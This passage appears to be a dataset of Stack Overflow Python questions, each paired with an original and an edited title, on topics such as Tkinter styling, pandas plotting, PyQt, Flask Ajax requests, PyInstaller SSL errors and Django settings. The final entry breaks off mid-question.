Notebook tab background and borderwidth not working (Tkinter - ttk)," I been playing around with TKinter trying to create a multiple tab window.When I try to style the TNotebook.Tab it ignores the options background and borderwidth, but it acknowledges foreground. What am I doing wrong?Here is the relevant part of the code: Here is an image of what the window looks like:In case it matters, I'm running python 2.7 on Windows 7 64-bit. <code>  COLOR_1 = 'black'COLOR_2 = 'white'COLOR_3 = 'red'COLOR_4 = '#2E2E2E'COLOR_5 = '#8A4B08'COLOR_6 = '#DF7401'#Notebook StylenoteStyler = ttk.Style()noteStyler.configure(""TNotebook"", background=COLOR_1, borderwidth=0)noteStyler.configure(""TNotebook.Tab"", background=COLOR_1, foreground=COLOR_3, lightcolor=COLOR_6, borderwidth=0)noteStyler.configure(""TFrame"", background=COLOR_1, foreground=COLOR_2, borderwidth=0)#Create Notebook and Tabsnote = ttk.Notebook(gui, style='TNotebook')myTab = ttk.Frame(note, style='TFrame')note.add(myTab, text = 'MyTab', compound=tk.TOP) note.pack(anchor=tk.W)","ttk styling ""TNotebook.Tab"" background and borderwidth not working"
(Tkinter - ttk) - Style 'TNotebook.Tab' background and borderwidth not working," I been playing around with TKinter trying to create a multiple tab window.When I try to style the TNotebook.Tab it ignores the options background and borderwidth, but it acknowledges foreground. What am I doing wrong?Here is the relevant part of the code: Here is an image of what the window looks like:In case it matters, I'm running python 2.7 on Windows 7 64-bit. <code>  COLOR_1 = 'black'COLOR_2 = 'white'COLOR_3 = 'red'COLOR_4 = '#2E2E2E'COLOR_5 = '#8A4B08'COLOR_6 = '#DF7401'#Notebook StylenoteStyler = ttk.Style()noteStyler.configure(""TNotebook"", background=COLOR_1, borderwidth=0)noteStyler.configure(""TNotebook.Tab"", background=COLOR_1, foreground=COLOR_3, lightcolor=COLOR_6, borderwidth=0)noteStyler.configure(""TFrame"", background=COLOR_1, foreground=COLOR_2, borderwidth=0)#Create Notebook and Tabsnote = ttk.Notebook(gui, style='TNotebook')myTab = ttk.Frame(note, style='TFrame')note.add(myTab, text = 'MyTab', compound=tk.TOP) note.pack(anchor=tk.W)","ttk styling ""TNotebook.Tab"" background and borderwidth not working"
how to get all the substings of a string in Python?," Here is my code, but I want a better solution, how do you think about the problem? <code>  def get_all_substrings(string): length = len(string) alist = [] for i in xrange(length): for j in xrange(i,length): alist.append(string[i:j + 1]) return alistprint get_all_substring('abcde')",How To Get All The Contiguous Substrings Of A String In Python?
how to get all the contiguous substings of a string in Python?," Here is my code, but I want a better solution, how do you think about the problem? <code>  def get_all_substrings(string): length = len(string) alist = [] for i in xrange(length): for j in xrange(i,length): alist.append(string[i:j + 1]) return alistprint get_all_substring('abcde')",How To Get All The Contiguous Substrings Of A String In Python?
how to get all the contiguous substrings of a string in Python?," Here is my code, but I want a better solution, how do you think about the problem? <code>  def get_all_substrings(string): length = len(string) alist = [] for i in xrange(length): for j in xrange(i,length): alist.append(string[i:j + 1]) return alistprint get_all_substring('abcde')",How To Get All The Contiguous Substrings Of A String In Python?
difference @override in Java and @decorator in Python, I read some documentation of it and realized that there appears to be a relationship between @override in Java and @decorator in Python. Can someone explain the relationship in plain English?I understand that functions in Python are first class object and functions can be parameter of another function.How does this @override syntax in Java differ from decorators in Python? <code> ,Difference between @override in Java and @decorator in Python
How to output a paragraph with line breaks in django and mysql?," I have text saved in a database record that looks like this. When I output it on the Django template, it comes out like this How can I output the text on my django template to reflect the way it appears in the database? <code>  This is the textThis is on a new line with a space in between This is the text This is on a new line with a space in between",How to output text from database with line breaks in a django template?
How to output text with line breaks in a django template?," I have text saved in a database record that looks like this. When I output it on the Django template, it comes out like this How can I output the text on my django template to reflect the way it appears in the database? <code>  This is the textThis is on a new line with a space in between This is the text This is on a new line with a space in between",How to output text from database with line breaks in a django template?
how to get pip to point to newer version of python," I have two versions of Python installed on my centOS server. The older version (2.6) is required by some essential centOS packages so I can't remove it. When I install packages using pip, they are being installed in Python 2.6. But instead I want them to be installed to Python 2.7. How can I change this behaviour?For example, here is what happened when I tried installing Wand EditI found this answer but it didn't work for me https://stackoverflow.com/a/4910393/3384340 <code>  [ethan@demo ~]$ python2.6 --versionPython 2.6.6[ehtan@demo ~]$ python --versionPython 2.7.3 [ethan@demo ~]$ pip install WandRequirement already satisfied (use --upgrade to upgrade): Wand in /usr/lib/python2.6/site-packagesCleaning up...[ethan@demo ~]$ python2.6Python 2.6.6 (r266:84292, Jul 10 2013, 22:48:45) [GCC 4.4.7 20120313 (Red Hat 4.4.7-3)] on linux2Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> import wand>>> exit()[ethan@demo ~]$ pythonPython 2.7.3 (default, Oct 11 2013, 15:59:28) [GCC 4.4.7 20120313 (Red Hat 4.4.7-3)] on linux2Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> import wandTraceback (most recent call last): File ""<stdin>"", line 1, in <module>ImportError: No module named wand>>> exit()",How to get pip to point to newer version of Python
Python: Split a string to N equal parts?," I have a string I would like to split into N equal parts. For example, imagine I had a string with length 128 and I want to split it in to 4 chunks of length 32 each; i.e., first 32 chars, then the second 32 and so on.How can I do this? <code> ",Split a string into N equal parts?
Using nested loops to generate 3 different random numbers," I've got something here, but I can't get it working how I like it: The bit above generates numbers, but they may be the same.The below code this should fix that, but it doesn't, but it just seems to decrease the likelihood: It is fairly obvious it just prints them. <code>  def nested_loops(): import random option1 = random.randint(1, 3) option2 = random.randint(1, 3) option3 = random.randint(1, 3) while option1 == option2: option1 = random.randint(1,3) while option1 == option3: option1 = random.randint(1, 3) while option2 == option3: option2 = random.randint(1, 3)print(option1)print(option2)print(option3)",Generate three different random numbers
generate 3 different random numbers," I've got something here, but I can't get it working how I like it: The bit above generates numbers, but they may be the same.The below code this should fix that, but it doesn't, but it just seems to decrease the likelihood: It is fairly obvious it just prints them. <code>  def nested_loops(): import random option1 = random.randint(1, 3) option2 = random.randint(1, 3) option3 = random.randint(1, 3) while option1 == option2: option1 = random.randint(1,3) while option1 == option3: option1 = random.randint(1, 3) while option2 == option3: option2 = random.randint(1, 3)print(option1)print(option2)print(option3)",Generate three different random numbers
generate n different random numbers from given range," I've got something here, but I can't get it working how I like it: The bit above generates numbers, but they may be the same.The below code this should fix that, but it doesn't, but it just seems to decrease the likelihood: It is fairly obvious it just prints them. <code>  def nested_loops(): import random option1 = random.randint(1, 3) option2 = random.randint(1, 3) option3 = random.randint(1, 3) while option1 == option2: option1 = random.randint(1,3) while option1 == option3: option1 = random.randint(1, 3) while option2 == option3: option2 = random.randint(1, 3)print(option1)print(option2)print(option3)",Generate three different random numbers
Compiling python 3.4 is not copying pip," I have compiled Python 3.4 from the sources on Linux Mint, but for some reason it is not copying pip to its final compiled folder (after the make install).Any ideas? <code> ",Compiling Python 3.4 is not copying pip
How do I html unescape an html escaped string with a hyphen in python?, I have a unicode escaped string: I want to convert this string into the unicode unescaped version 'blah-dude'How do I do this? <code>  > str = 'blah\\x2Ddude',How do I unescape a unicode escaped string in python?
How to throw error and exit in python," I've seen people suggesting sys.exit() in Python.My question is that, is there any other way to exit the execution of current script, I mean termination, with an error.Something like this: Currently my solution would be: <code>  sys.exit(""You can not have three process at the same time."") print(""You can not have three process at the same time."")sys.exit()",How to throw error and exit with a custom message in python
Check import order coding standard," PEP8 suggests that: Imports should be grouped in the following order: standard library imports related third party imports local application/library specific imports You should put a blank line between each group of imports.Is there a way to check if the standard is violated anywhere in the package using static code analysis tools, like pylint, pyflakes, pychecker, pep8?Example of violation: Correct way to import: <code>  from my_package import my_modulefrom django.db import modelsimport os import osfrom django.db import modelsfrom my_package import my_module",Import order coding standard
Split large text file(around 50GB) into multiple files using python," I would like to split a large text file around size of 50GB into multiple files.Data in the files are like this-[x= any integer between 0-9] There might be few billions of lines in the file and i would like write for example 30/40 millions per file. I guess the steps would be-I've to open the file then using readline() have to read the file line by line and write at the same time to a new file and as soon as it hits the maximum number of lines it will create another file andstarts writing again.I'm wondering, how to put all these steps together in a memory efficient and faster way. I've seen some examples in stack but none of them totally helping what i exactly need. I would really appreciate if anyone could help me out. <code>  xxx.xxx.xxx.xxxxxx.xxx.xxx.xxxxxx.xxx.xxx.xxxxxx.xxx.xxx.xxx..............................",Split large text file(around 50GB) into multiple files
Pandas : How to bar plot two dataframes with the same index in one figure," So here is how my data set looks like : I want to have stacked bar plot for each dataframe but since they have same index, I'd like to have 2 stacked bars per index.I've tried to plot both on the same axes : But it overlaps.Then I tried to concat the two dataset first : but here everything is stackedMy best try is : Which gives :This is basically what I want, except that I want the bar ordered as(df1,A) (df2,A) (df1,B) (df2,B) etc...I guess there is a trick but I can't found it !After @bgschiller's answer I got this : Which is almost what I want. I would like the bar to be clustered by index, in order to have something visually clear.Bonus : Having the x-label not redundant, something like : Thanks for helping. <code>  In [1]: df1=pd.DataFrame(np.random.rand(4,2),index=[""A"",""B"",""C"",""D""],columns=[""I"",""J""])In [2]: df2=pd.DataFrame(np.random.rand(4,2),index=[""A"",""B"",""C"",""D""],columns=[""I"",""J""])In [3]: df1Out[3]: I JA 0.675616 0.177597B 0.675693 0.598682C 0.631376 0.598966D 0.229858 0.378817In [4]: df2Out[4]: I JA 0.939620 0.984616B 0.314818 0.456252C 0.630907 0.656341D 0.020994 0.538303 In [5]: ax = df1.plot(kind=""bar"", stacked=True)In [5]: ax2 = df2.plot(kind=""bar"", stacked=True, ax = ax) pd.concat(dict(df1 = df1, df2 = df2),axis = 1).plot(kind=""bar"", stacked=True) pd.concat(dict(df1 = df1, df2 = df2),axis = 0).plot(kind=""bar"", stacked=True) df1 df2 df1 df2_______ _______ ... A B",How to have clusters of stacked bars with python (Pandas)
How to have multiple stacked bar plot per index (Pandas)," So here is how my data set looks like : I want to have stacked bar plot for each dataframe but since they have same index, I'd like to have 2 stacked bars per index.I've tried to plot both on the same axes : But it overlaps.Then I tried to concat the two dataset first : but here everything is stackedMy best try is : Which gives :This is basically what I want, except that I want the bar ordered as(df1,A) (df2,A) (df1,B) (df2,B) etc...I guess there is a trick but I can't found it !After @bgschiller's answer I got this : Which is almost what I want. I would like the bar to be clustered by index, in order to have something visually clear.Bonus : Having the x-label not redundant, something like : Thanks for helping. <code>  In [1]: df1=pd.DataFrame(np.random.rand(4,2),index=[""A"",""B"",""C"",""D""],columns=[""I"",""J""])In [2]: df2=pd.DataFrame(np.random.rand(4,2),index=[""A"",""B"",""C"",""D""],columns=[""I"",""J""])In [3]: df1Out[3]: I JA 0.675616 0.177597B 0.675693 0.598682C 0.631376 0.598966D 0.229858 0.378817In [4]: df2Out[4]: I JA 0.939620 0.984616B 0.314818 0.456252C 0.630907 0.656341D 0.020994 0.538303 In [5]: ax = df1.plot(kind=""bar"", stacked=True)In [5]: ax2 = df2.plot(kind=""bar"", stacked=True, ax = ax) pd.concat(dict(df1 = df1, df2 = df2),axis = 1).plot(kind=""bar"", stacked=True) pd.concat(dict(df1 = df1, df2 = df2),axis = 0).plot(kind=""bar"", stacked=True) df1 df2 df1 df2_______ _______ ... A B",How to have clusters of stacked bars with python (Pandas)
How to have cluster of stacked bars with python (Pandas)," So here is how my data set looks like : I want to have stacked bar plot for each dataframe but since they have same index, I'd like to have 2 stacked bars per index.I've tried to plot both on the same axes : But it overlaps.Then I tried to concat the two dataset first : but here everything is stackedMy best try is : Which gives :This is basically what I want, except that I want the bar ordered as(df1,A) (df2,A) (df1,B) (df2,B) etc...I guess there is a trick but I can't found it !After @bgschiller's answer I got this : Which is almost what I want. I would like the bar to be clustered by index, in order to have something visually clear.Bonus : Having the x-label not redundant, something like : Thanks for helping. <code>  In [1]: df1=pd.DataFrame(np.random.rand(4,2),index=[""A"",""B"",""C"",""D""],columns=[""I"",""J""])In [2]: df2=pd.DataFrame(np.random.rand(4,2),index=[""A"",""B"",""C"",""D""],columns=[""I"",""J""])In [3]: df1Out[3]: I JA 0.675616 0.177597B 0.675693 0.598682C 0.631376 0.598966D 0.229858 0.378817In [4]: df2Out[4]: I JA 0.939620 0.984616B 0.314818 0.456252C 0.630907 0.656341D 0.020994 0.538303 In [5]: ax = df1.plot(kind=""bar"", stacked=True)In [5]: ax2 = df2.plot(kind=""bar"", stacked=True, ax = ax) pd.concat(dict(df1 = df1, df2 = df2),axis = 1).plot(kind=""bar"", stacked=True) pd.concat(dict(df1 = df1, df2 = df2),axis = 0).plot(kind=""bar"", stacked=True) df1 df2 df1 df2_______ _______ ... A B",How to have clusters of stacked bars with python (Pandas)
Python: Adding rows to QTableView using QAbstractTableModel," I am super new to Qt programming. I am trying to make a simple table that can have rows added by clicking a button. I can implement the table fine but can't seem to get the updated data to show on the table. I believe my problem stems from the fact that I can't seem to properly call any sort of ""change data"" method using the button. I've tried several different solutions online all of which have lead to 4 year old, dead-end posts. What I have so far is the basic structure, I just can't figure out how to make the table update with new data.This is the basic viewI have set up with some test data.In the final implementation, the table will start empty and I would like to append rows and have them displayed in the table view. <code>  import sysfrom PyQt4.QtCore import *from PyQt4.QtGui import *class MyWindow(QWidget): def __init__(self): QWidget.__init__(self) # create table self.get_table_data() self.table = self.createTable() # layout self.layout = QVBoxLayout() self.testButton = QPushButton(""test"") self.connect(self.testButton, SIGNAL(""released()""), self.test) self.layout.addWidget(self.testButton) self.layout.addWidget(self.table) self.setLayout(self.layout) def get_table_data(self): self.tabledata = [[1234567890,2,3,4,5], [6,7,8,9,10], [11,12,13,14,15], [16,17,18,19,20]] def createTable(self): # create the view tv = QTableView() # set the table model header = ['col_0', 'col_1', 'col_2', 'col_3', 'col_4'] tablemodel = MyTableModel(self.tabledata, header, self) tv.setModel(tablemodel) # set the minimum size tv.setMinimumSize(400, 300) # hide grid tv.setShowGrid(False) # hide vertical header vh = tv.verticalHeader() vh.setVisible(False) # set horizontal header properties hh = tv.horizontalHeader() hh.setStretchLastSection(True) # set column width to fit contents tv.resizeColumnsToContents() # set row height tv.resizeRowsToContents() # enable sorting tv.setSortingEnabled(False) return tv def test(self): self.tabledata.append([1,1,1,1,1]) self.emit(SIGNAL('dataChanged()')) print 'success'class MyTableModel(QAbstractTableModel): def __init__(self, datain, headerdata, parent=None): """""" Args: datain: a list of lists\n headerdata: a list of strings """""" QAbstractTableModel.__init__(self, parent) self.arraydata = datain self.headerdata = headerdata def rowCount(self, parent): return len(self.arraydata) def columnCount(self, parent): if len(self.arraydata) > 0: return len(self.arraydata[0]) return 0 def data(self, index, role): if not index.isValid(): return QVariant() elif role != Qt.DisplayRole: return QVariant() return QVariant(self.arraydata[index.row()][index.column()]) def setData(self, index, value, role): pass # not sure what to put here def headerData(self, col, orientation, role): if orientation == Qt.Horizontal and role == Qt.DisplayRole: return QVariant(self.headerdata[col]) return QVariant() def sort(self, Ncol, order): """""" Sort table by given column number. """""" self.emit(SIGNAL(""layoutAboutToBeChanged()"")) self.arraydata = sorted(self.arraydata, key=operator.itemgetter(Ncol)) if order == Qt.DescendingOrder: self.arraydata.reverse() self.emit(SIGNAL(""layoutChanged()""))if __name__ == ""__main__"": app = QApplication(sys.argv) w = MyWindow() w.show() sys.exit(app.exec_())",PyQt: Adding rows to QTableView using QAbstractTableModel
Python dict.setdefault doesn't work like expected," To illustrate the problem I created a simple example: I will expect that once a cache is set a function get_person_age will be never called again, but this is not true: Function is called again and again. What's wrong? <code>  #!/usr/bin/env pythonclass Person(): def __init__(self): self.cache = {} def get_person_age(self): def get_age(): print ""Calculating age..."" return self.age print self.cache return self.cache.setdefault(self.name, get_age()) def set_person(self, name, age): self.name = name self.age = agep = Person()p.set_person('andrei', 12)for k in range(0, 5): p.get_person_age() $ python cache_test.py {}Calculating age...{'andrei': 12}Calculating age...{'andrei': 12}Calculating age...{'andrei': 12}Calculating age...{'andrei': 12}Calculating age...",Why does setdefault evaluate default when key is set?
Flask and Ajax Post requests 400," I am writing a small flask based site and I would like to send data from the client to the server using Ajax. Until now I have only used Ajax requests to retrieve data from the server. This time I would like to submit data via POST request.This is the receiver on the flask side, I reduced it to barely log a message to avoid any unnecessary errors within the implementation of this route: When submitting the ajax request, flask gives me a 400 error I can also see this in the web developer console in the browserWhy is flask not calling submit_handler with the supplied data in the request? <code>  @app.route(""/json_submit"", methods=[""POST""])def submit_handler(): # a = request.get_json(force=True) app.logger.log(""json_submit"") return {} 127.0.0.1 - - [03/Apr/2014 09:18:50] ""POST /json_submit HTTP/1.1"" 400 - var request = $.ajax({ url: ""/json_submit"", type: ""POST"", data: { id: id, known: is_known }, dataType: ""json"", }) .done( function (request) { })",Flask and Ajax Post HTTP 400 Bad Request Error
Is the list of Python reserved words available in a library?, Is the list of Python reserved words and builtins available in a library? I want to do something like: <code>  from x.y import reserved_words_and_builtins if x in reserved_words_and_builtins: x += '_',Is the list of Python reserved words and builtins available in a library?
Add HTML Form Option Value To SQLAlchemy Session using Flask and WTForms," Here is my HTML dropdown menu. The value is the primary key of the child table. I need to update Post.category_id with the value integer 1 instead of ""Category Number One"". Here is my code. I've tried making... Now wouldn't that be nice! <code>  <select id=""category"" name=""category""> <option selected value=""__None""></option> <option value=""1"">Category Number One</option> <option value=""2"">Category Number Two</option></select> # create new post@app.route('/admin/post', methods=['GET', 'POST'])@login_required # Required for Flask-Securitydef create_post(): form = PostForm() if form.validate_on_submit(): post = Post(title=form.title.data, body=form.body.data, pub_date=form.pub_date.data, cateogry_id=form.category.data) db.session.add(post) db.session.commit() flash('Your post has been published.') return redirect(url_for('admin')) posts = Post.query.all() return render_template('create_post.html', form=form, posts=posts) cateogry_id=form.category.datacateogry_id=form.category.value","A Complete Many-to-One Example Using Flask, WTForm, SQLAlchemy, and Jinja2"
"How to Update Parent Table With HTML Form Value Tag Using Flask, WTForms, SQLAlchemy?"," Here is my HTML dropdown menu. The value is the primary key of the child table. I need to update Post.category_id with the value integer 1 instead of ""Category Number One"". Here is my code. I've tried making... Now wouldn't that be nice! <code>  <select id=""category"" name=""category""> <option selected value=""__None""></option> <option value=""1"">Category Number One</option> <option value=""2"">Category Number Two</option></select> # create new post@app.route('/admin/post', methods=['GET', 'POST'])@login_required # Required for Flask-Securitydef create_post(): form = PostForm() if form.validate_on_submit(): post = Post(title=form.title.data, body=form.body.data, pub_date=form.pub_date.data, cateogry_id=form.category.data) db.session.add(post) db.session.commit() flash('Your post has been published.') return redirect(url_for('admin')) posts = Post.query.all() return render_template('create_post.html', form=form, posts=posts) cateogry_id=form.category.datacateogry_id=form.category.value","A Complete Many-to-One Example Using Flask, WTForm, SQLAlchemy, and Jinja2"
"How to capture form value using Flask, WTForms, SQLAlchemy?"," Here is my HTML dropdown menu. The value is the primary key of the child table. I need to update Post.category_id with the value integer 1 instead of ""Category Number One"". Here is my code. I've tried making... Now wouldn't that be nice! <code>  <select id=""category"" name=""category""> <option selected value=""__None""></option> <option value=""1"">Category Number One</option> <option value=""2"">Category Number Two</option></select> # create new post@app.route('/admin/post', methods=['GET', 'POST'])@login_required # Required for Flask-Securitydef create_post(): form = PostForm() if form.validate_on_submit(): post = Post(title=form.title.data, body=form.body.data, pub_date=form.pub_date.data, cateogry_id=form.category.data) db.session.add(post) db.session.commit() flash('Your post has been published.') return redirect(url_for('admin')) posts = Post.query.all() return render_template('create_post.html', form=form, posts=posts) cateogry_id=form.category.datacateogry_id=form.category.value","A Complete Many-to-One Example Using Flask, WTForm, SQLAlchemy, and Jinja2"
OverflowError error numbers," Catching Python's OverflowError after some dumb calculation, I checked the error's args and saw it's a tuple containing an integer as its first coordinate. I assume this is some kind of error number (errno). However, I could not find any documentation or reference for it.Example: Do you know what 34 means in this context? Do you know other possible error numbers for this exception? <code>  try: 1e4**100except OverflowError as ofe: print ofe.args## prints '(34, 'Numerical result out of range')'",Meaning of error numbers in Python exceptions
Does pandas.Series.unique() preserver order?," Simple question I haven't been able to find an answer to yet:Given a pandas Series, I think the order of values given by Series.unique() is that in which they are first encountered in the series, and not any sort sorted order. I.e. This is the behavior I want for my application, but can someone tell me if I'm guaranteed to get this order? The documentation is not clear. <code>  from pandas import Seriess = Series(['b','b','b','a','a','b'])s.unique()>>> array(['b', 'a'], dtype=object)",Does pandas.Series.unique() preserve order?
Python recursion RuntineError," We all know that calling this function in Python will produce RuntimeError: maximum recursion depth exceededI wrote its sligtly modified version: The second function runs forever without throwing RuntimeError. What's more, I was not able to stop it with CtrlC combination. I dont understand why calling f2() does not throw RuntimeError. Can you explain it please? <code>  def f1(): f1() def f2(): try: f2() #This line throws an error finally: #except works too f2() #This line does not throw an error!",Python recursion RuntimeError
Why is it a sytanx error to invoke a method on a numeric literal in Python?," I can invoke methods on numbers only when I bind them to a name: I can invoke methods on string literals: But I cannot invoke methods on numeric literals: This raises a SyntaxError. Is there a practical reason for that, or is it historic?Edit Just found this related question that shows workarounds (that have already been suggested here as well). I guess this also answers the main question - with simple workarounds available, there probably wasn't enough benefit to making the grammar more complex (and harder to parse) to make this work. <code>  >>> a = 5>>> a.bit_length()3 >>> 'Hello World'.lower()'hello world' >>> 5.bit_length()",Why is it a syntax error to invoke a method on a numeric literal in Python?
Recovering features names of explained_variance_ration in PCA with sklearn," I'm trying to recover from a PCA done with scikit-learn, which features are selected as relevant.A classic example with IRIS dataset. This returns How can I recover which two features allow these two explained variance among the dataset ?Said diferently, how can i get the index of this features in iris.feature_names ? Thanks in advance for your help. <code>  import pandas as pdimport pylab as plfrom sklearn import datasetsfrom sklearn.decomposition import PCA# load datasetiris = datasets.load_iris()df = pd.DataFrame(iris.data, columns=iris.feature_names)# normalize datadf_norm = (df - df.mean()) / df.std()# PCApca = PCA(n_components=2)pca.fit_transform(df_norm.values)print pca.explained_variance_ratio_ In [42]: pca.explained_variance_ratio_Out[42]: array([ 0.72770452, 0.23030523]) In [47]: print iris.feature_names['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)']",Recovering features names of explained_variance_ratio_ in PCA with sklearn
PyQt - how to make getOpenFileName remember last opening path?," According to getOpenFileName instructions: How can I make the dialog remember the path the last time when I close it?and what does the tr mean in the tr(""Open File"")? Thanks <code>  QString fileName = QFileDialog.getOpenFileName(this, tr(""Open File""), ""/home"", tr(""Images (*.png *.xpm *.jpg)""));",how to make getOpenFileName remember last opening path?
distributed lock manager for python, I have a bunch of servers with multiple instances accessing a resource that has a hard limit on requests per second.I need a mechanism to lock the access on this resource for all servers and instances that are running.There is a restful distributed lock manager I found on github: https://github.com/thefab/restful-distributed-lock-managerUnfortunately there seems to be a min. lock time of 1 second and it's relatively unreliable. In several tests it took between 1 and 3 seconds to unlock a 1 second lock.Is there something well tested with a python interface I can use for this purpose?Edit: I need something that auto unlocks in under 1 second. The lock will never be released in my code. <code> ,Distributed lock manager for Python
Python app(check files in GCS) not work after packaging into exe using PyInstaller," I code a python script to check files in GCS, it uses wxpython to generate the GUI. To authenticate I did it in this way(following the way in Google sample code -> http://code.google.com/p/google-cloud-platform-samples/source/browse/file-transfer-json/chunked_transfer.py?repo=storage): The codes above are contained in my Python script, which works very well when it is just a python .py file, later I used pyinstaller convert it to .exe in win 7 64bit(I also put the secret file in the same folder as the .exe file) using below command C:\gcs_file_check>python pyinstaller-2.0\pyinstaller.py -w gcs_file_check.pyWhen clicking on the exe, the Request for Permission page from Google was launched correctly(as what it is as running Python script not exe), but after I click Accept, the above code will throw exception: [Errno 185090050] _ssl.c:343: error:0B084002:x509 certificate routines:X509_load_cert_crl_file:system libAnd I can see the file credentials.json is not created by .exe, while the Python script can create this file correctly.Could someone know how this happens and how to fix? Appreciate every answer!===================updated on 04/16:I added debugging code and found that the exception exactly comes from below code: ===================updated:Add more detail, previously I was using oauth2client.tools.run() Now I change to run_flow() as the source code suggested -> https://google-api-python-client.googlecode.com/hg/docs/epy/oauth2client.tools-pysrc.html#run Now this part of code is: But still, the python code works well, and throw the same exception [Errno 185090050] after packaging to .exe by PyInstaller. <code>  flow = flow_from_clientsecrets(CLIENT_SECRETS_FILE, # the secrets file I put in same folder scope=scope, message=MISSING_CLIENT_SECRETS_MESSAGE)credential_storage = CredentialStorage(CREDENTIALS_FILE) # the file to store # authentication credentialscredentials = credential_storage.get()if credentials is None or credentials.invalid: credentials = run_oauth2(flow, credential_storage)self.printLog('Constructing Google Cloud Storage service...')http = credentials.authorize(httplib2.Http())return discovery_build('storage', 'v1beta1', http=http) if credentials is None or credentials.invalid: credentials = run_oauth2(flow, credential_storage) from oauth2client.tools import run as run_oauth2 from oauth2client.tools import run_flow as run_oauth2 parser=argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter, parents=[tools.argparser] ) flags = tools.argparser.parse_args(sys.argv[1:])if credentials is None or credentials.invalid: credentials = run_oauth2(flow, credential_storage, flags)","Errno 185090050 _ssl.c:343: error:0B084002:x509 certificate routines:X509_load_cert_crl_file:system lib, after packaging to exe by PyInstaller"
Python app(check files in GCS) not work after converting to .exe using PyInstaller," I code a python script to check files in GCS, it uses wxpython to generate the GUI. To authenticate I did it in this way(following the way in Google sample code -> http://code.google.com/p/google-cloud-platform-samples/source/browse/file-transfer-json/chunked_transfer.py?repo=storage): The codes above are contained in my Python script, which works very well when it is just a python .py file, later I used pyinstaller convert it to .exe in win 7 64bit(I also put the secret file in the same folder as the .exe file) using below command C:\gcs_file_check>python pyinstaller-2.0\pyinstaller.py -w gcs_file_check.pyWhen clicking on the exe, the Request for Permission page from Google was launched correctly(as what it is as running Python script not exe), but after I click Accept, the above code will throw exception: [Errno 185090050] _ssl.c:343: error:0B084002:x509 certificate routines:X509_load_cert_crl_file:system libAnd I can see the file credentials.json is not created by .exe, while the Python script can create this file correctly.Could someone know how this happens and how to fix? Appreciate every answer!===================updated on 04/16:I added debugging code and found that the exception exactly comes from below code: ===================updated:Add more detail, previously I was using oauth2client.tools.run() Now I change to run_flow() as the source code suggested -> https://google-api-python-client.googlecode.com/hg/docs/epy/oauth2client.tools-pysrc.html#run Now this part of code is: But still, the python code works well, and throw the same exception [Errno 185090050] after packaging to .exe by PyInstaller. <code>  flow = flow_from_clientsecrets(CLIENT_SECRETS_FILE, # the secrets file I put in same folder scope=scope, message=MISSING_CLIENT_SECRETS_MESSAGE)credential_storage = CredentialStorage(CREDENTIALS_FILE) # the file to store # authentication credentialscredentials = credential_storage.get()if credentials is None or credentials.invalid: credentials = run_oauth2(flow, credential_storage)self.printLog('Constructing Google Cloud Storage service...')http = credentials.authorize(httplib2.Http())return discovery_build('storage', 'v1beta1', http=http) if credentials is None or credentials.invalid: credentials = run_oauth2(flow, credential_storage) from oauth2client.tools import run as run_oauth2 from oauth2client.tools import run_flow as run_oauth2 parser=argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter, parents=[tools.argparser] ) flags = tools.argparser.parse_args(sys.argv[1:])if credentials is None or credentials.invalid: credentials = run_oauth2(flow, credential_storage, flags)","Errno 185090050 _ssl.c:343: error:0B084002:x509 certificate routines:X509_load_cert_crl_file:system lib, after packaging to exe by PyInstaller"
PyQt: How to connect QComboBox to function," QComboBox is connected to a function using following syntax: But I need to be able to send the arguments from ComboBox to myFunction(). But if I use: I am getting What syntax needs to be used to connect a QComboBox to a function that is able to receive arguments sent from Comobobox?EDITED LATER:Here is the code resulting an TypeError: connect() slot argument should be a callable or a signal, not 'NoneType' <code>  myComboBox.activated.connect(self.myFunction ) myComboBox.activated.connect(self.myFunction(myArg1, myArg2 ) TypeError: connect() slot argument should be a callable or a signal, not 'NoneType' from PyQt4 import QtCore, QtGuiimport sysclass MyClass(object): def __init__(self, arg): super(MyClass, self).__init__() self.arg = arg class myWindow(QtGui.QWidget): def __init__(self, parent=None): super(myWindow, self).__init__(parent) self.comboBox = QtGui.QComboBox(self) self.comboBox.addItems([str(x) for x in range(3)]) self.myObject=MyClass(id(self) ) self.comboBox.activated.connect(self.myFunction(self.myObject, 'someArg')) def myFunction(self, arg1=None, arg2=None): print '\n\t myFunction(): ', type(arg1),type(arg2)if __name__ == ""__main__"": app = QtGui.QApplication(sys.argv) app.setApplicationName('myApp') dialog = myWindow() dialog.show() sys.exit(app.exec_())",PyQt: How to connect QComboBox to function with Arguments
Change pandas plot backgournd color, Is it possible to change the background in a pandas chart?I would like to change the background from white and the line to orange but I cannot find any documentation to do that.I am using the pandas as follows: Is it possible to change the background to black or any other color? <code>  import pandas.io.data as webimport numpy as npgs = web.get_data_yahoo('gs')['Close']gs = gs.pct_change()gs.plot(),Change pandas plot background color
Set DJANGO_SETTINGS_MODULE as an Enviroment Variable in Windows permanently," How can I permanently set the environmental variable DJANGO_SETTINGS_MODULE on WINDOWS on a permanent basis and be done with it?I meanWin Button + Pause/Break ButtonThis leads to Control Panel\System and Security\SystemClick Advanced System SettingsClick Environment VariablesThere are two boxes the first is titled User variables and the second System variablesOn the System variables click the New ButtonFor variable name put in DJANGO_IMPORT_SETTINGSXXX--> WHAT DO I PUT IN VARIABLE VALUE TO SET IT ONCE AND FOR ALL?In the Django Site on this issue it states:DJANGO_SETTINGS_MODULEWhen you use Django, you have to tell it which settings youre using. Do this by using an environment variable, DJANGO_SETTINGS_MODULE.The value of DJANGO_SETTINGS_MODULE should be in Python path syntax,e.g. mysite.settings. Note that the settings module should be on the Python import search path.What does it mean ...should be in Python path syntax e.g. mysite.settings... ?I have a certain directory where my Python is located:C:\Python27 I have a certain directory where my Django is located: C:\Python27\Lib\site-packages\djangoWhat does this mysite means. What directory is it meanning C:\Something......Can you put this variable once and for all or you have to constantly change it for every project (I hope not!)And what does this suspiciously line means Note that the settings module should be on the Python import search path.All I want it to set the DJANGO_SETTINGS_MODULE environmental variable and be done once and for all from this hassleEDITIn order to work, Django just has to be pointed at a valid settings file, and by default itlooks for an environment variable named DJANGO_SETTINGS_MODULE to tell it where to find thesettings. The value of this variable should be the Python import path of the settings file, suchas cms.settings.--> What king of directory is this: cms.settings? In windows every directory starts with a hard drive as C:\Something...... How can you start a directory like this in 